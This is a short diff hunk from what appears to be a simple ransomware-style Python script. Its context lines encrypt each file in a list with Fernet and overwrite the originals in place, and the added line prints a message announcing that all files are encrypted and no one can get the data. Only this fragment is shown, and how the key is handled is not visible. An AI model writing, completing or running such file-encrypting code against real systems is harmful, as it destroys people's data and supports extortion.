@@ -29,3 +29,5 @@ for file in files:
     contents_encrypted = Fernet(key).encrypt(contents)
     with open(file,"wb") as thefile:
         thefile.write(contents_encrypted)
+
+print("Your all files has been encrypted now no one get the data")
